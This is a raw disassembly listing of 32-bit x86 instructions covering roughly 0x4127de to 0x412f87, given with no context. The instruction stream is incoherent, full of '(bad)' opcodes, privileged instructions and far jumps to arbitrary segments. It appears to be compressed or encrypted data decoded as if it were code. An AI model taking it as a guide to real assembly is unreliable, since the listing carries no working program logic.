  4127de:	jbe    0x4127c6
  4127e0:	cli    
  4127e1:	sbb    eax,0xcd2d70c9
  4127e6:	repz arpl WORD PTR [ebp-0x34cc7c34],di
  4127ed:	mov    bh,BYTE PTR [edi-0x23]
  4127f0:	sub    dl,BYTE PTR [ecx]
  4127f2:	lods   al,BYTE PTR ds:[esi]
  4127f3:	dec    ebp
  4127f4:	loop   0x412802
  4127f6:	xor    al,0x23
  4127f8:	cli    
  4127f9:	cwde   
  4127fa:	mov    eax,0x56a07f11
  4127ff:	xchg   esi,eax
  412800:	leave  
  412801:	jns    0x412817
  412803:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412804:	mov    esi,0x50c0a87f
  412809:	jne    0x4127ba
  41280b:	xchg   esi,eax
  41280c:	mov    ebx,ebp
  41280e:	fs pop eax
  412810:	rcl    ah,1
  412812:	cli    
  412813:	stc    
  412814:	adc    eax,0x33338614
  412819:	jno    0x412813
  41281b:	shl    DWORD PTR [esi-0x31],cl
  41281e:	dec    ebx
  41281f:	or     esi,DWORD PTR [edx]
  412821:	(bad)  
  412822:	xor    al,0x41
  412824:	mov    bl,0xd0
  412826:	fist   WORD PTR [eax]
  412828:	dec    edi
  412829:	cli    
  41282a:	lds    esi,FWORD PTR [ebx+0x4dcc2076]
  412830:	push   edi
  412831:	leave  
  412832:	std    
  412833:	add    eax,0x6399e8d7
  412838:	mov    al,0x75
  41283a:	sbb    BYTE PTR [edx],0xd1
  41283d:	repnz dec esp
  41283f:	fwait
  412840:	in     eax,dx
  412841:	rcr    DWORD PTR [esi],cl
  412843:	sub    al,0x9d
  412845:	xchg   esp,eax
  412846:	jmp    0xf70a7d7a
  41284b:	fbstp  TBYTE PTR [edx+0xa]
  41284e:	mov    ds:0x40ae0f02,eax
  412853:	sbb    cl,BYTE PTR [eax-0x6d2b1dc4]
  412859:	clc    
  41285a:	mov    eax,ds:0xfc3abae
  41285f:	and    cl,BYTE PTR ds:0xe0b4b9cb
  412865:	call   0x58b9:0x35000f43
  41286c:	and    DWORD PTR [edx+0x4359bb16],esi
  412872:	sub    DWORD PTR [ecx],eax
  412874:	out    dx,al
  412875:	cmp    ch,BYTE PTR [ebp-0x65]
  412878:	jmp    0xa7cb6464
  41287d:	jae    0x4128de
  41287f:	hlt    
  412880:	iret   
  412881:	push   cs
  412882:	pop    esi
  412883:	add    dh,BYTE PTR [edx+0x22]
  412886:	mov    ecx,0xab414773
  41288b:	sar    BYTE PTR [ebx-0xe],cl
  41288e:	bound  esp,QWORD PTR [esi+0x35]
  412891:	adc    BYTE PTR [edx-0x3a],al
  412894:	imul   ebx,DWORD PTR [edi-0x4c0e89d8],0xffffffef
  41289b:	push   0x40002502
  4128a0:	mov    ds:0x8e4e66e3,al
  4128a5:	adc    eax,0xa1d2026
  4128aa:	add    BYTE PTR [ecx+0x4e],ch
  4128ad:	into   
  4128ae:	or     eax,DWORD PTR [eax+0x29d85e96]
  4128b4:	jo     0x412885
  4128b6:	cmova  ecx,DWORD PTR [ecx+0x2d]
  4128ba:	aaa    
  4128bb:	xor    BYTE PTR [ebp+0xa35a3c6],bl
  4128c1:	mov    esp,0x4e38d16f
  4128c6:	adc    ebx,edi
  4128c8:	dec    ecx
  4128c9:	push   ds
  4128ca:	call   0x545a:0xecd3fcdf
  4128d1:	xchg   esi,eax
  4128d2:	pop    ss
  4128d3:	or     BYTE PTR [edx],0x51
  4128d6:	pushf  
  4128d7:	fsub   DWORD PTR [esp+ecx*4+0x50]
  4128db:	and    eax,DWORD PTR [ebx]
  4128dd:	add    DWORD PTR [ebx+0xb],esi
  4128e0:	jne    0x412908
  4128e2:	sbb    bh,BYTE PTR [ebp-0x75]
  4128e5:	in     al,0x21
  4128e7:	jp     0x412958
  4128e9:	or     esi,DWORD PTR [esi+edx*4-0x6a]
  4128ed:	fisubr WORD PTR [bp+si]
  4128f0:	jne    0x41293a
  4128f2:	(bad)  
  4128f3:	ror    BYTE PTR [eax-0x2722ac78],1
  4128f9:	mul    BYTE PTR [edx+esi*1]
  4128fc:	cmp    BYTE PTR [eax],dl
  4128fe:	or     al,0xcc
  412900:	adc    DWORD PTR [eax+0x6f],ebp
  412903:	aam    0xdd
  412905:	int3   
  412906:	test   BYTE PTR [edi-0xc],bh
  412909:	and    esp,DWORD PTR [edi-0x1eb93c23]
  41290f:	mov    esp,esp
  412911:	mov    al,0x1e
  412913:	ja     0x412905
  412915:	and    eax,0x42595256
  41291a:	inc    esp
  41291b:	ret    0x430d
  41291e:	call   0x955433a7
  412923:	cmc    
  412924:	mov    eax,ds:0xff156c40
  412929:	in     al,0xa2
  41292b:	(bad)  
  41292c:	jge    0x412959
  41292e:	mov    BYTE PTR [ecx],bl
  412930:	lds    ebp,FWORD PTR [eax+esi*8]
  412933:	jns    0x412987
  412935:	push   ebx
  412936:	mov    eax,0xd5cf7979
  41293b:	sar    BYTE PTR [edi-0x55],0x25
  41293f:	push   esi
  412940:	inc    eax
  412941:	stos   DWORD PTR es:[edi],eax
  412942:	imul   edi,esi,0xffffffbd
  412945:	gs adc al,0xb8
  412948:	retf   
  412949:	dec    esp
  41294a:	pop    edx
  41294b:	add    BYTE PTR [eax-0x23b976cf],dl
  412951:	(bad)  
  412952:	(bad)  
  412954:	and    eax,0xcb3e6c85
  412959:	sub    BYTE PTR [ebx-0x5b2c4229],al
  41295f:	loopne 0x41293d
  412961:	ins    BYTE PTR es:[edi],dx
  412962:	into   
  412963:	pop    ss
  412964:	int3   
  412965:	jmp    0x95d0:0x7064c904
  41296c:	xchg   esp,eax
  41296d:	inc    ecx
  41296e:	or     BYTE PTR [edi],bh
  412970:	lahf   
  412971:	sbb    cl,BYTE PTR [esi]
  412973:	pop    ebx
  412974:	sub    al,0x7a
  412976:	je     0x4129cd
  412978:	add    BYTE PTR [esi],ah
  41297a:	lods   al,BYTE PTR ds:[esi]
  41297b:	sub    eax,0xb1bf33ea
  412980:	cmp    al,0xa0
  412982:	shr    BYTE PTR [ebp+ebp*8+0x6af266bd],cl
  412989:	(bad)  
  41298a:	xchg   ecx,eax
  41298b:	xchg   esi,eax
  41298c:	push   edx
  41298d:	(bad)  
  41298e:	dec    ebp
  41298f:	dec    esp
  412990:	sbb    DWORD PTR [eax+0x9],ebx
  412993:	dec    ebp
  412994:	aas    
  412995:	xor    BYTE PTR [ebp+0x1aa32f22],ch
  41299b:	std    
  41299c:	xor    al,0x23
  41299e:	shr    dh,0x40
  4129a1:	mov    cl,0x96
  4129a3:	lods   eax,DWORD PTR ds:[esi]
  4129a4:	lods   eax,DWORD PTR ds:[esi]
  4129a5:	xchg   esp,eax
  4129a6:	dec    edx
  4129a7:	sbb    al,0x9b
  4129a9:	dec    ebx
  4129aa:	mov    eax,0xa029fef9
  4129af:	sbb    BYTE PTR [edx+0x24c57fce],0xa8
  4129b6:	sbb    DWORD PTR [esi+0x62273b00],eax
  4129bc:	push   esp
  4129bd:	dec    edi
  4129be:	sub    DWORD PTR [ebx],0x30df1bc7
  4129c4:	hlt    
  4129c5:	adc    bl,BYTE PTR [ecx]
  4129c7:	xchg   edi,eax
  4129c8:	and    BYTE PTR [ecx+eax*8-0x7e],0x57
  4129cd:	das    
  4129ce:	add    edi,ebp
  4129d0:	push   ss
  4129d1:	fwait
  4129d2:	push   0x32
  4129d4:	loope  0x4129b5
  4129d6:	jo     0x4129d9
  4129d8:	xchg   ecx,eax
  4129d9:	jb     0x412973
  4129db:	stos   DWORD PTR es:[edi],eax
  4129dc:	jmp    0x4129f4
  4129de:	inc    eax
  4129df:	sub    al,0x82
  4129e1:	retf   
  4129e2:	or     ebx,ebx
  4129e4:	cmp    al,0x5f
  4129e6:	lods   al,BYTE PTR ds:[esi]
  4129e7:	out    dx,al
  4129e8:	mov    edx,0x11eacfab
  4129ed:	mov    BYTE PTR [esi+0x5c910c5a],bl
  4129f3:	mov    ecx,0xda10d7d3
  4129f8:	cmp    esp,DWORD PTR ds:0xee37ab66
  4129fe:	daa    
  4129ff:	nop
  412a00:	fucomi st,st(6)
  412a02:	fsubr  st,st(0)
  412a04:	sbb    al,0xff
  412a06:	imul   ebp,esi,0x89ca7f44
  412a0c:	test   eax,0xc4e1216e
  412a11:	cmp    ch,BYTE PTR [esi+0x8]
  412a14:	adc    DWORD PTR [edi+0x25],0x23be4a76
  412a1b:	sbb    al,ah
  412a1d:	in     eax,dx
  412a1e:	ffree  st(3)
  412a20:	sbb    DWORD PTR [si+0xd],0x292d43f3
  412a28:	xlat   BYTE PTR ds:[ebx]
  412a29:	sub    bh,dh
  412a2b:	push   ebp
  412a2c:	es pop ebx
  412a2e:	jp     0x412a90
  412a30:	call   0x3698994a
  412a35:	pop    ds
  412a36:	lods   al,BYTE PTR ds:[esi]
  412a37:	push   0xea1d2759
  412a3c:	xor    bh,bl
  412a3e:	aad    0x61
  412a40:	mov    cl,0x61
  412a42:	es push es
  412a44:	cwde   
  412a45:	push   edx
  412a46:	push   cs
  412a47:	dec    ebx
  412a48:	inc    edi
  412a49:	add    BYTE PTR [ebx-0x7a],ch
  412a4c:	mov    eax,0x6cf0bc80
  412a51:	xor    al,0x5c
  412a53:	sub    dl,BYTE PTR [edx+0x5]
  412a56:	aad    0xb8
  412a58:	adc    DWORD PTR [esi+0x28],ecx
  412a5b:	leave  
  412a5c:	das    
  412a5d:	lock pop eax
  412a5f:	add    eax,DWORD PTR [edi+0x76]
  412a62:	push   edi
  412a63:	les    edi,FWORD PTR [ecx+0x5610376e]
  412a69:	ins    DWORD PTR es:[edi],dx
  412a6a:	and    esp,0xffffffe9
  412a6d:	stos   DWORD PTR es:[edi],eax
  412a6e:	fdiv   st(6),st
  412a70:	mov    dl,0x4a
  412a72:	(bad)  [edx]
  412a74:	aam    0xd2
  412a76:	jmp    0xc42f:0x89f06320
  412a7d:	lock pop ss
  412a7f:	ret    0xf54f
  412a82:	push   cs
  412a83:	mov    ds:0x5aa12da3,eax
  412a88:	sub    al,0xba
  412a8a:	mov    WORD PTR [ebx+ebx*8+0x15],ds
  412a8e:	popf   
  412a8f:	fimul  WORD PTR [edx+edi*1-0x7b]
  412a93:	sahf   
  412a94:	cmp    eax,0xa5c9152b
  412a99:	in     eax,0xaf
  412a9b:	xor    al,0x71
  412a9d:	pop    esi
  412a9e:	cmp    bh,BYTE PTR [edx]
  412aa0:	jmp    0x5705:0x82e02de
  412aa7:	and    ch,BYTE PTR [edi+0x5a98424c]
  412aad:	push   edi
  412aae:	(bad)  
  412aaf:	push   ss
  412ab0:	pushf  
  412ab1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ab2:	push   esp
  412ab3:	pop    ecx
  412ab4:	stc    
  412ab5:	xor    al,al
  412ab7:	fsubrp st(4),st
  412ab9:	and    BYTE PTR [ebx+edx*2-0x209746b6],bl
  412ac0:	mov    ds:0x5587e84f,al
  412ac5:	or     ecx,DWORD PTR [ecx-0xd1fd5e8]
  412acb:	ins    DWORD PTR es:[edi],dx
  412acc:	call   0x5127:0x1a901c9c
  412ad3:	push   cs
  412ad4:	cmp    BYTE PTR [edx],0xd0
  412ad7:	std    
  412ad8:	push   ss
  412ad9:	test   BYTE PTR [edi+0x4d],al
  412adc:	cmp    eax,0x4accc3c
  412ae1:	pop    edx
  412ae2:	cmp    BYTE PTR [edi+0x717d8e6a],dl
  412ae8:	retf   
  412ae9:	(bad)  
  412aea:	shl    DWORD PTR [ebx-0x1d959131],cl
  412af0:	add    DWORD PTR [ecx],0xffffff85
  412af3:	daa    
  412af4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412af5:	shr    BYTE PTR [edi-0x46],0x7d
  412af9:	cdq    
  412afa:	push   0x18e1b7b4
  412aff:	lds    ebx,FWORD PTR [ecx-0x3b]
  412b02:	and    DWORD PTR [eax*8-0x29b09150],eax
  412b09:	scas   eax,DWORD PTR es:[edi]
  412b0a:	gs jle 0x412b78
  412b0d:	and    al,0xf
  412b0f:	mov    dh,0xfe
  412b11:	mov    bl,0x9b
  412b13:	jecxz  0x412b6d
  412b15:	dec    ax
  412b17:	mov    DWORD PTR [ebx+0x2a73d1df],esi
  412b1d:	or     eax,0xce4df572
  412b22:	stos   DWORD PTR es:[edi],eax
  412b23:	add    eax,0x6317f1a
  412b28:	pop    esp
  412b29:	inc    eax
  412b2a:	push   eax
  412b2b:	outs   dx,BYTE PTR ds:[esi]
  412b2c:	ins    DWORD PTR es:[edi],dx
  412b2d:	sahf   
  412b2e:	mov    esp,0x9c22cbe3
  412b33:	dec    edi
  412b34:	sbb    edi,DWORD PTR [eax]
  412b36:	adc    edi,edx
  412b38:	cmp    ebx,DWORD PTR [esi-0x7eab9784]
  412b3e:	int3   
  412b3f:	cli    
  412b40:	xchg   ebx,eax
  412b41:	scas   al,BYTE PTR es:[edi]
  412b42:	icebp  
  412b43:	pusha  
  412b44:	sbb    BYTE PTR [edx+0x35],dh
  412b47:	ins    DWORD PTR es:[edi],dx
  412b48:	push   es
  412b49:	pop    edi
  412b4a:	and    BYTE PTR [ecx],ch
  412b4c:	adc    esi,ecx
  412b4e:	dec    esi
  412b4f:	pop    ss
  412b50:	mov    ch,0xb4
  412b52:	push   es
  412b53:	shr    DWORD PTR [esi+0x64],1
  412b56:	fnsave ds:0x669df977
  412b5c:	mov    BYTE PTR [ebp+0x1cbf1435],0x42
  412b63:	push   ebx
  412b64:	stos   BYTE PTR es:[edi],al
  412b65:	fstp   QWORD PTR [eax+0xe608b6d]
  412b6b:	lahf   
  412b6c:	inc    edi
  412b6d:	jl     0x412bdd
  412b6f:	and    DWORD PTR [eax],ecx
  412b71:	jo     0x412b14
  412b73:	int3   
  412b74:	xchg   BYTE PTR [ebx-0x1a],dh
  412b77:	pop    ss
  412b78:	ja     0x412bde
  412b7a:	jbe    0x412b4c
  412b7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b7d:	icebp  
  412b7e:	nop
  412b7f:	dec    edi
  412b80:	fdivr  DWORD PTR [ecx]
  412b82:	mov    esp,0xccbca6df
  412b87:	mov    dh,0x9b
  412b89:	pop    ebx
  412b8a:	pop    ebp
  412b8b:	add    ebp,DWORD PTR [ebx-0x1d]
  412b8e:	les    ecx,FWORD PTR [esi]
  412b90:	imul   ecx,DWORD PTR [edx+ecx*2],0xf
  412b94:	or     al,0x1d
  412b96:	sbb    esp,edi
  412b98:	xchg   BYTE PTR [ebp-0x4c],al
  412b9b:	ret    
  412b9c:	ja     0x412bdf
  412b9e:	or     eax,0xd8990835
  412ba3:	fs jmp 0x412b2e
  412ba6:	aaa    
  412ba7:	sub    al,0x52
  412ba9:	or     al,0xfa
  412bab:	xchg   edi,eax
  412bac:	and    al,0xb4
  412bae:	push   ds
  412baf:	mov    cl,0xe0
  412bb1:	or     ebp,DWORD PTR [eax]
  412bb3:	mov    ds:0xc5f7ed09,al
  412bb8:	call   0x706f:0xc59d
  412bbe:	js     0x412ba0
  412bc0:	test   eax,0x1a2af55d
  412bc5:	xor    edx,DWORD PTR [ebx+edi*1+0x59cd57d3]
  412bcc:	mov    dh,0xe8
  412bce:	cmp    DWORD PTR [ebp+0xc87fd91],eax
  412bd4:	mov    dl,0x3
  412bd6:	test   BYTE PTR [edi+ebx*1+0x6bb557c3],0x4c
  412bde:	test   eax,0x35b7b74f
  412be3:	ret    0x3f5c
  412be6:	and    WORD PTR [esp+eiz*2+0x16d520ea],sp
  412bee:	cmc    
  412bef:	mov    cl,0x77
  412bf1:	test   BYTE PTR [edi+0x8a91020],0xd
  412bf8:	fldcw  WORD PTR [edi]
  412bfa:	adc    BYTE PTR [ebx-0x67],bh
  412bfd:	xor    DWORD PTR [edx-0x18],esp
  412c00:	adc    al,0x39
  412c02:	js     0x412c13
  412c04:	mov    esi,0xcdff7339
  412c09:	leave  
  412c0a:	(bad)  
  412c0b:	mov    ds:0x8fd0b490,eax
  412c10:	push   esi
  412c11:	mul    BYTE PTR [edx+0x1e]
  412c14:	and    eax,0xa8776a79
  412c19:	add    BYTE PTR [edi+0x30],cl
  412c1c:	mov    WORD PTR [edx],ss
  412c1e:	xchg   BYTE PTR [esi+ecx*1],dh
  412c21:	adc    al,0xa3
  412c23:	int3   
  412c24:	pop    ss
  412c25:	repnz pop edx
  412c27:	mov    edx,0xe32f0f3a
  412c2c:	xchg   ebx,eax
  412c2d:	cmp    ch,BYTE PTR [eax+0x61]
  412c30:	sub    eax,0x6c2f2741
  412c35:	cmc    
  412c36:	dec    edi
  412c37:	xchg   edx,eax
  412c38:	mov    ecx,0xc9fd09ff
  412c3d:	(bad)  
  412c3e:	cs jns 0x412c89
  412c41:	test   ah,dl
  412c43:	hlt    
  412c44:	ins    DWORD PTR es:[edi],dx
  412c45:	stc    
  412c46:	addr16 repnz (bad) 
  412c49:	sub    al,0x24
  412c4b:	mov    ebp,0x36e6cbf3
  412c50:	cmp    dl,BYTE PTR ds:0xf697ddd0
  412c56:	rol    al,0x31
  412c59:	and    eax,0xe17e424e
  412c5e:	mov    al,ds:0x26f412d8
  412c63:	xor    BYTE PTR [esp+ecx*2+0x5d],cl
  412c67:	dec    esp
  412c68:	or     al,dl
  412c6a:	les    edi,FWORD PTR [ecx-0x74]
  412c6d:	loop   0x412c2a
  412c6f:	or     al,0xef
  412c71:	push   bp
  412c73:	rcl    DWORD PTR [edx],0x62
  412c76:	and    BYTE PTR [eax],bl
  412c78:	mov    WORD PTR [eax],gs
  412c7a:	mov    fs,WORD PTR [ebp+0xd2cbaf2]
  412c80:	pop    eax
  412c81:	pop    ds
  412c82:	frstor [ebx+0x45b4dd4c]
  412c88:	std    
  412c89:	aaa    
  412c8a:	test   eax,0x6ad38bda
  412c8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c90:	adc    al,0xbc
  412c92:	jno    0x412c69
  412c94:	mov    dh,BYTE PTR [esi]
  412c96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c97:	xchg   DWORD PTR [esi-0x3be5e311],esp
  412c9d:	mov    esp,0xa30bfd9
  412ca2:	lods   eax,DWORD PTR ds:[esi]
  412ca3:	mov    esp,0x73d62b01
  412ca8:	mov    al,0xe4
  412caa:	not    DWORD PTR [edi-0x74]
  412cad:	mov    esi,ebp
  412caf:	and    DWORD PTR [edx-0xb],0xffffff82
  412cb3:	retf   
  412cb4:	or     dl,BYTE PTR [edi+0x15c6890e]
  412cba:	cmp    al,0x9f
  412cbc:	arpl   WORD PTR [ebp-0xe63bdae],sp
  412cc2:	adc    al,0x2e
  412cc4:	mov    ds:0x5c3c6710,eax
  412cc9:	ins    BYTE PTR es:[edi],dx
  412cca:	inc    edi
  412ccb:	cmc    
  412ccc:	stos   BYTE PTR es:[edi],al
  412ccd:	(bad)  
  412ccf:	ficomp WORD PTR [ecx]
  412cd1:	or     al,BYTE PTR [esi+0x4f]
  412cd4:	jge    0x412d34
  412cd6:	mov    ds:0x90fefa9f,eax
  412cdb:	les    ecx,FWORD PTR [esi-0x761c855b]
  412ce1:	fnstsw WORD PTR [edx+0x429458da]
  412ce7:	push   esi
  412ce8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ce9:	push   ebx
  412cea:	dec    eax
  412ceb:	mov    ah,0x60
  412ced:	shl    DWORD PTR [eax+ebx*8+0x6afe4b6d],1
  412cf4:	sbb    BYTE PTR [edi-0x77ee2388],bl
  412cfa:	sub    ah,BYTE PTR [ecx-0x25]
  412cfd:	adc    al,0xde
  412cff:	clc    
  412d00:	adc    al,0xce
  412d02:	xchg   ebx,eax
  412d03:	test   al,0x24
  412d05:	pop    ss
  412d06:	fs (bad) 
  412d08:	xchg   esi,eax
  412d09:	xchg   esi,edi
  412d0b:	retf   
  412d0c:	inc    edx
  412d0d:	outs   dx,BYTE PTR ds:[esi]
  412d0e:	adc    BYTE PTR [ebp+0x4a],0xd7
  412d12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d13:	js     0x412ca4
  412d15:	cmc    
  412d16:	or     al,0xca
  412d18:	out    dx,eax
  412d19:	fist   WORD PTR [esi-0x72]
  412d1c:	add    dh,BYTE PTR [edi-0x1e]
  412d1f:	stos   DWORD PTR es:[edi],eax
  412d20:	pop    ds
  412d21:	sub    dh,BYTE PTR [ebx]
  412d23:	dec    edx
  412d24:	test   al,0x94
  412d26:	sbb    DWORD PTR [esi+eax*4],0xea6cdbbf
  412d2d:	leave  
  412d2e:	mov    ecx,0xca11b360
  412d33:	jecxz  0x412d6b
  412d35:	cmp    esp,esi
  412d37:	mov    bl,0x65
  412d39:	stos   BYTE PTR es:[edi],al
  412d3a:	and    esp,0xf8d0cc69
  412d40:	push   esp
  412d41:	xor    DWORD PTR [ebx],ecx
  412d43:	ins    BYTE PTR es:[edi],dx
  412d44:	or     dh,BYTE PTR [ecx-0x4758ec97]
  412d4a:	mov    eax,0xa5c7f7aa
  412d4f:	jne    0x412d93
  412d51:	jmp    0x412cf3
  412d53:	push   0xffffff88
  412d55:	push   eax
  412d56:	cmp    ah,BYTE PTR [ebp-0x7]
  412d59:	pusha  
  412d5a:	xchg   esp,eax
  412d5b:	js     0x412d3d
  412d5d:	cmp    al,0x40
  412d5f:	loopne 0x412d01
  412d61:	mov    ecx,0xd0bc1cc5
  412d66:	or     dh,BYTE PTR [ecx-0x24]
  412d69:	shrd   ebx,ebp,cl
  412d6c:	or     al,0xf5
  412d6e:	mov    al,ds:0xd94bfcac
  412d73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d74:	xor    DWORD PTR [esp+eiz*8],ebp
  412d77:	sub    dl,dl
  412d79:	outs   dx,BYTE PTR ds:[esi]
  412d7a:	xchg   esi,eax
  412d7b:	pop    edx
  412d7c:	pop    ecx
  412d7d:	or     DWORD PTR [ecx+0x1a],0x78
  412d81:	int    0x42
  412d83:	inc    BYTE PTR [ecx+0x7e]
  412d86:	int3   
  412d87:	outs   dx,BYTE PTR ds:[esi]
  412d88:	scas   eax,DWORD PTR es:[edi]
  412d89:	lahf   
  412d8a:	fwait
  412d8b:	loope  0x412d96
  412d8d:	xchg   BYTE PTR fs:[edi],bl
  412d90:	mov    cl,0x9c
  412d92:	mov    esi,0xfb0b9936
  412d97:	test   al,0xb5
  412d99:	add    ch,al
  412d9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d9c:	ins    DWORD PTR es:[edi],dx
  412d9d:	(bad)  
  412d9e:	gs and al,0x7c
  412da1:	add    DWORD PTR [ecx-0x4a2ddfa4],eax
  412da7:	and    al,0xa8
  412da9:	pop    edx
  412daa:	popa   
  412dab:	mov    es,WORD PTR [ecx+0xd]
  412dae:	scas   al,BYTE PTR es:[edi]
  412daf:	stos   DWORD PTR es:[edi],eax
  412db0:	cdq    
  412db1:	and    ch,BYTE PTR [edi-0x75]
  412db4:	mov    al,0x22
  412db6:	push   cs
  412db7:	pop    esp
  412db8:	sti    
  412db9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412dba:	adc    DWORD PTR [eax],eax
  412dbc:	cmp    BYTE PTR [eax-0xdfa6f6d],al
  412dc2:	iret   
  412dc3:	cmp    al,0x8a
  412dc5:	push   ecx
  412dc6:	int3   
  412dc7:	xchg   ebx,eax
  412dc8:	nop
  412dc9:	jl     0x412e1f
  412dcb:	xchg   esp,eax
  412dcc:	cmp    eax,0x8e98ad92
  412dd1:	scas   al,BYTE PTR es:[edi]
  412dd2:	xor    al,0x5c
  412dd4:	data16 and BYTE PTR [edi+esi*2+0x75],dh
  412dd9:	cmp    ebp,esp
  412ddb:	imul   edx,DWORD PTR [edx],0xfffffff7
  412dde:	or     DWORD PTR [esi+ecx*1+0xc4a388],edx
  412de5:	mov    edx,0x61494006
  412dea:	clc    
  412deb:	and    al,0x6
  412ded:	mov    eax,ds:0x752ca62f
  412df2:	or     eax,esi
  412df4:	fisttp DWORD PTR [ebx-0x2]
  412df7:	mul    bl
  412df9:	and    eax,0x50558072
  412dfe:	rcl    DWORD PTR [ebp+0xbff880b],0x90
  412e05:	push   edi
  412e06:	outs   dx,BYTE PTR ds:[esi]
  412e07:	jo     0x412e2b
  412e09:	jo     0x412e45
  412e0b:	mov    BYTE PTR [ecx+0x75b79660],dh
  412e11:	and    eax,DWORD PTR [edi+0x1e]
  412e14:	mov    esp,0x189a3571
  412e19:	retf   0xe269
  412e1c:	loop   0x412e53
  412e1e:	(bad)  
  412e1f:	push   0x4b
  412e21:	gs xor eax,0x58527532
  412e27:	cmc    
  412e28:	xor    esi,DWORD PTR [edx+0x24ea82fc]
  412e2e:	(bad)
  412e32:	push   0x41113c6a
  412e37:	rcl    esp,cl
  412e39:	in     eax,0x6
  412e3b:	cs and esp,eax
  412e3e:	sbb    BYTE PTR [esi],0x78
  412e41:	fwait
  412e42:	sbb    bh,bl
  412e44:	fdivr  QWORD PTR [ebx]
  412e46:	rcl    BYTE PTR [edi+0x6bc57ff2],0x9
  412e4d:	or     BYTE PTR [edx],0xb4
  412e50:	ja     0x412e49
  412e52:	adc    edx,ebx
  412e54:	inc    eax
  412e55:	and    BYTE PTR [ebx+0x70],0xcb
  412e59:	inc    edi
  412e5a:	and    DWORD PTR [eax+0x77cf4b21],edx
  412e60:	jecxz  0x412ec8
  412e62:	add    DWORD PTR [ebp-0x51],eax
  412e65:	and    DWORD PTR [ebp+0x16b96949],ebp
  412e6b:	push   0xd
  412e6d:	sbb    ebp,DWORD PTR [ebp+0x78]
  412e70:	mov    dh,0x2f
  412e72:	addr16 pop esp
  412e74:	popa   
  412e75:	(bad)  [ebx]
  412e77:	call   0x4d11:0xf7f73e46
  412e7e:	iret   
  412e7f:	mov    ebp,0x43291de8
  412e84:	clc    
  412e85:	cdq    
  412e86:	or     eax,0xa1fb6794
  412e8c:	and    ebx,DWORD PTR [edi]
  412e8e:	inc    esi
  412e8f:	daa    
  412e90:	nop
  412e91:	mov    bl,0x5f
  412e93:	inc    eax
  412e94:	int    0x52
  412e96:	jp     0x412eb4
  412e98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e99:	push   0xffffff80
  412e9b:	test   BYTE PTR [edx-0x31],cl
  412e9e:	ins    BYTE PTR es:[edi],dx
  412e9f:	xor    ebx,eax
  412ea1:	inc    ebx
  412ea2:	jge    0x412e57
  412ea4:	(bad)  
  412ea5:	das    
  412ea6:	loope  0x412e31
  412ea8:	scas   al,BYTE PTR es:[edi]
  412ea9:	lock shl DWORD PTR [ebx],cl
  412eac:	je     0x412e52
  412eae:	jmp    0xade:0x224e4248
  412eb5:	loope  0x412f1e
  412eb7:	xchg   esi,eax
  412eb8:	jo     0x412ef5
  412eba:	dec    edx
  412ebb:	jns    0x412e76
  412ebd:	mov    bh,0xdc
  412ebf:	dec    edx
  412ec0:	mov    ?,WORD PTR ds:0x8b96f5d9
  412ec6:	add    DWORD PTR fs:0x3eb8976c,edx
  412ecd:	cs mov ebp,0xd8dc2ea8
  412ed3:	cmp    al,0x5f
  412ed5:	(bad)  
  412ed6:	adc    eax,0xc73d7bc7
  412edb:	mov    cl,0xcf
  412edd:	mov    DWORD PTR [eax-0x77],ebx
  412ee0:	add    DWORD PTR [esp+ebx*4-0x3],esp
  412ee4:	lods   al,BYTE PTR ds:[esi]
  412ee5:	lahf   
  412ee6:	sub    esi,DWORD PTR [ecx-0xd]
  412ee9:	cld    
  412eea:	js     0x412f68
  412eec:	test   BYTE PTR [ebx+eax*1+0x75],cl
  412ef0:	out    0x71,eax
  412ef2:	rcl    DWORD PTR [ebp-0x5c],cl
  412ef5:	add    DWORD PTR [ebx+eiz*4-0x2327caa5],ecx
  412efc:	mov    ch,0xe9
  412efe:	(bad)  
  412eff:	aad    0xa8
  412f01:	outs   dx,DWORD PTR ds:[esi]
  412f02:	jmp    0x412f79
  412f04:	pushf  
  412f05:	(bad)  
  412f06:	scas   al,BYTE PTR es:[edi]
  412f07:	adc    ch,BYTE PTR [edx+edi*4-0x68cad75b]
  412f0e:	mov    bh,0x9b
  412f10:	push   0xe0eabdf0
  412f15:	outs   dx,BYTE PTR ds:[esi]
  412f16:	lea    esp,[eax-0x8]
  412f19:	popa   
  412f1a:	dec    esi
  412f1b:	push   esp
  412f1c:	mov    eax,0xcbe2a367
  412f21:	pop    edi
  412f22:	xor    eax,0xefa94a77
  412f27:	cmp    DWORD PTR [edi],edx
  412f29:	(bad)  
  412f2a:	xchg   esp,eax
  412f2b:	xor    bl,BYTE PTR [ebx+0x515932aa]
  412f31:	pop    es
  412f32:	bound  edx,QWORD PTR [edi-0x20]
  412f35:	les    edi,FWORD PTR [edi+0x71]
  412f38:	(bad)  
  412f39:	sbb    ebx,edx
  412f3b:	mov    ah,0x85
  412f3d:	out    0x7,eax
  412f3f:	(bad)  
  412f40:	mov    al,0x7
  412f42:	les    esp,FWORD PTR [ebx-0x39fd3241]
  412f48:	mov    eax,0x39837ed
  412f4d:	pop    eax
  412f4e:	das    
  412f4f:	pop    ebx
  412f50:	mov    edx,0x51d9a017
  412f55:	xchg   ebp,eax
  412f56:	jp     0x412f18
  412f58:	mov    ds:0xfdc28ebc,al
  412f5d:	aas    
  412f5e:	out    0x7f,al
  412f60:	inc    edi
  412f61:	pop    ebp
  412f62:	loope  0x412fde
  412f64:	das    
  412f65:	sub    DWORD PTR [ecx],esi
  412f67:	ss mov bh,0xce
  412f6a:	inc    edi
  412f6b:	rcl    DWORD PTR [edx-0x1ce5504c],0x8b
  412f72:	lds    edx,FWORD PTR [edx-0x7e7ead3a]
  412f78:	pusha  
  412f79:	outs   dx,DWORD PTR ds:[esi]
  412f7a:	call   0xe8bf:0xc9a764e0
  412f81:	enter  0x21cb,0x5b
  412f85:	test   al,0x4
  412f87:	inc    edi
